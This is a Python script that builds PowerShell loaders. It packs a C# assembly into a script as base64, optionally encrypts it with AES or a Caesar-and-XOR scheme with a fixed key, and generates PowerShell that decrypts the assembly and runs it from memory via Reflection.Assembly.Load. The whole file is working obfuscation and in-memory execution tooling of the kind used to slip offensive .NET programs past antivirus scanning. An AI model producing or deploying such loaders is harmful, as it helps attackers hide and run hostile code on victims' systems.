import sys
import os
import base64
import random
import string
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad

class MyEncoder:
    @staticmethod
    def xor(buf, key):
        return bytearray([((buf[i]^ord(key[i % len(key)])) & 0xFF) for i in range(len(buf))])

    @staticmethod
    def caesar(in_byte_array, num):
        buf = in_byte_array
        encoded = bytearray([(byte + num) & 0xFF for byte in buf])
        # print(encoded)
        return encoded

def AESEncrypt(key, iv, data):
    ## new 一個 AES CBC cipher
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return (cipher.encrypt(pad(data, AES.block_size)))

def AESEncryptFileToBase64(aes_key, aes_iv, filename):
    with open(filename, 'rb') as f:
        data = f.read()
        enc_data = AESEncrypt(aes_key, aes_iv, data)
        enc_data = base64.b64encode(enc_data)
        return enc_data.decode('utf-8')


class CxEncoder:
    def __init__(self, CAESAR_NUM, XOR_KEY):
        self.CAESAR_NUM = CAESAR_NUM
        self.XOR_KEY = XOR_KEY
        self.powershell = '$buf = cae $buf %d;$buf = xor $buf "%s"' % (CAESAR_NUM, XOR_KEY)


    def cxencode(self, buf):
        return self.caesar(self.xor(buf))

    def xor(self, buf):
        return bytearray([((buf[i]^ord(self.XOR_KEY[i % len(self.XOR_KEY)])) & 0xFF) for i in range(len(buf))])

    def caesar(self, buf):
        buf = buf
        encoded = bytearray([(byte + self.CAESAR_NUM) & 0xFF for byte in buf])
        # print(encoded)
        return encoded

aes_template = '''function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    return $aesManaged
}

function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    return [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-Bytes($key, $IV, $data) {
    $bytes = $data
    $aesManaged = Create-AesManagedObject $key $IV
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $encData = $encryptedData
    $aesManaged.Dispose()
    return $encData
}

function Decrypt-Bytes($key, $IV, $enc_data) {
    $bytes = $enc_data
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    [byte[]] $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    $aesManaged.Dispose()
    
    return ,$unencryptedData
}
function {{function_name}}
{

    $key = [System.Text.Encoding]::ASCII.GetBytes("{{aes_key}}")
    $key = [System.Convert]::ToBase64String($key)
    $iv = [System.Text.Encoding]::ASCII.GetBytes("{{aes_iv}}")
    $iv = [System.Convert]::ToBase64String($iv)

    $buf = [System.Convert]::FromBase64String("{{base64_bin}}")
    $buf = Decrypt-Bytes $key $iv $buf

    [System.Reflection.Assembly]::Load($buf)
    [{{classname}}]::{{method}}($args)
}
'''

encoder_template = '''
function xor {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Byte[]] $s,
        [Parameter(Position = 1)] [string] $key
    )
    [Byte[]] $b = new-object -TypeName Byte[] -ArgumentList @($s.Length);
    [Byte[]] $kb = [System.Text.Encoding]::ASCII.GetBytes($key);
    for($i=0; $i -lt $b.Length; $i++) {
        $b[$i] = ($s[$i] -bxor $kb[$i % $kb.length]) -band 0xff;
    }
    return ,$b;
}
function cae {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Byte[]] $s,
        [Parameter(Position = 1)] [int] $key
    )
    [Byte[]] $b = new-object -TypeName Byte[] -ArgumentList @($s.Length);
    for($i=0; $i -lt $b.Length; $i++) {
        $b[$i] = ($s[$i] -$key) -band 0xff;
    }
    return ,$b;
}
function b64 {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Byte[]] $s,
        [Parameter(Position = 1)] [int] $key
    )
    [System.Collections.Generic.List[Byte]] $g = New-Object System.Collections.Generic.List[Byte](,$s);
    for($i=0; $i -lt $key; $i++) {
        $g = new-object System.Collections.Generic.List[Byte](,[System.Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString($g.ToArray())));
    }
    return $g.ToArray();
}

if ([Environment]::Is64BitProcess)
{
    Write-Host "64-bit OS"
}
else
{
    Write-Host "32-bit OS"
}
function {{function_name}}{
$buf = [System.Convert]::FromBase64String("{{base64_bin}}")
{{code}}
[System.Reflection.Assembly]::Load($buf)
[{{classname}}]::{{method}}($args)
}

'''




powershell_template = '''
function {{function_name}}
{
    [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String("{{base64_bin}}"))
    [{{classname}}]::{{method}}($args)
}
'''


parser = argparse.ArgumentParser()
parser.add_argument("filename", help="C# assembly file (e.g. exe or dll)")
parser.add_argument("output", help="Output powershell filename")
parser.add_argument("-c", '--classname', help="C# assembly class. Default: Program. Example: Namespace.Program", default='Program')
parser.add_argument("-m", '--method', help="C# assembly method. Default: Main", default='Main')
parser.add_argument("-i", '--invoke-name', help="Invoke-<name> Default: filename")
parser.add_argument("-f", '--function-name', help="Default: Invoke-<name>")
parser.add_argument("-aes", "--aes", help="Encrypt c# assembly with AES", default=False, action='store_true')
parser.add_argument("-enc", "--enc", help="Encrypt c# assembly with Caesar and XOR", default=False, action='store_true')
args = parser.parse_args()

filename = args.filename
output = args.output
classname = args.classname
method = args.method
function_name = args.function_name
aes = args.aes
enc = args.enc

if function_name is None:
    function_name = 'Invoke-' + os.path.basename(filename).split('.')[0]

aes_key = ''.join(random.choice(string.ascii_letters) for x in range(16))
aes_iv = ''.join(random.choice(string.ascii_letters) for x in range(16))

CAESAR_NUM = 5
XOR_KEY = 'rilak'
cxencode = CxEncoder(CAESAR_NUM, XOR_KEY)

if aes:
    aes_exe = AESEncryptFileToBase64(aes_key.encode('ascii'), aes_iv.encode('ascii'), filename)
    payload = aes_template.replace('{{aes_key}}', aes_key)
    payload = payload.replace('{{aes_iv}}', aes_iv)
    payload = payload.replace('{{base64_bin}}', aes_exe)

elif enc:
    exe = open(filename, 'rb').read()
    encoded_exe = cxencode.cxencode(exe)
    #print(encoded_exe)
    base64_bin = base64.b64encode(encoded_exe).decode('utf-8')

    payload = encoder_template.replace('{{base64_bin}}', base64_bin)
    payload = payload.replace('{{code}}', cxencode.powershell)

else:
    exe = open(filename, 'rb').read()
    base64_bin = base64.b64encode(exe).decode('utf-8')
    payload = powershell_template.replace('{{base64_bin}}', base64_bin)

payload = payload.replace('{{function_name}}', function_name)
payload = payload.replace('{{classname}}', classname)
payload = payload.replace('{{method}}', method)

with open(output, 'w') as f:
    f.write(payload)